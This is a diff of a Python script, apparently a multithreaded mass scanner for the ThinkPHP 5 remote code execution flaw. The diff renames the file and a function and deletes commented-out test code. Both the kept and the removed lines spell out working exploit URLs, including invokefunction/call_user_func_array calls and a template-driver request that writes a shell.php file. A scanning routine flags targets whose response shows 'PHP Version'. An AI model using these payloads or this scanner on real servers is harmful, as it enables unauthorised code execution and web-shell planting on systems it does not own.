@@ -3,7 +3,7 @@
 """
 # Author: Sandy Li
 # Created Time : Thu 24 Jan 2019 06:52:37 PM CST
-# File Name: thinkphp5_rce_1852.py
+# File Name: thinkphp5_rce.py
 # Description:
 """
 import  threading, sys, time, random, socket, subprocess, re, os, struct, array
@@ -19,10 +19,7 @@ import multiprocessing
 
 Feed = collections.namedtuple("Feed", "url")
 lock = threading.RLock()
-# targets = open(sys.argv[1], "r").readlines()
 
-#payload = r"public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
-#payload = "public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
 """
 #payload = ['', r"public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
 #        r"public/index.php?s=index/\think\Request/input&filter=phpinfo&data=1",
@@ -30,27 +27,7 @@ lock = threading.RLock()
 #        r"public/index.php?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E",
 #        r"public/index.php?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E"]
 """
-"""
-class Testing():
-    def __init__(self, aname):
-        # threading.Thread.__init__(self)
-        self.aname = str(aname).rstrip('\n')
-    def run(self):
-        #for n in range(1,6):
-            #print url
-            #print i
-            try:
-                url = "http://" + self.aname + "/" + payload
-                r = requests.get(url,verify = False, timeout = 5)
-                if 'PHP Version' in r.text:
-                    print "[+]目标存在漏洞，请记录URL为 %r" % url
-                    return n
-                else:
-                    print "[！]目标无法连接,URL为%r" % url
-                    return False
-            except Exception as e:
-                pass
-"""
+
 
 def main():
     concurrency, filename = handle_commandline()
@@ -100,12 +77,12 @@ def worker(jobs, results):
     while True:
         try:
             feed = jobs.get()
-            shuting_testing(feed.url)
+            thinkphp_testing(feed.url)
         finally:
             jobs.task_done()
 
 
-def shuting_testing(aname):
+def thinkphp_testing(aname):
     try:
         lock.acquire()
         ip_scaned = re.findall(
@@ -148,27 +125,5 @@ def process(jobs):
 
 if __name__ == "__main__":
     main()
-
-
-
-
-
-# for target in targets:
-#     try:
-#         pass
-#         # n = Testing(target)
-#         # n.daemon = True
-#         # n.start()
-#
-#        # if n:
-#        #     print "[+]目标IP地址: %r 存在远程命令执行漏洞" % target
-#        # else:
-#        #     print "[-]目标IP地址不存在远程命令执行漏洞"
-#     except:
-#         pass
-
-
-
-
 
 
